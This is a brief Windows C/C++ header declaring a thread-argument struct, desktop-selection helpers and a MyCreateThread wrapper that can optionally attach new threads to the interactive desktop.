#pragma once

typedef struct
{
	unsigned(__stdcall *start_address)(void *);
	void	*arglist;
	bool	bInteractive; // 是否支持交互桌面
	HANDLE	hEventTransferArg;
}THREAD_ARGLIST, *LPTHREAD_ARGLIST;


BOOL SelectHDESK(HDESK new_desktop);
BOOL SelectDesktop(char *name);

unsigned int __stdcall ThreadLoader(LPVOID param);

HANDLE MyCreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, // SD
	SIZE_T dwStackSize,                       // initial stack size
	LPTHREAD_START_ROUTINE lpStartAddress,    // thread function
	LPVOID lpParameter,                       // thread argument
	DWORD dwCreationFlags,                    // creation option
	LPDWORD lpThreadId,
	bool bInteractive = false);
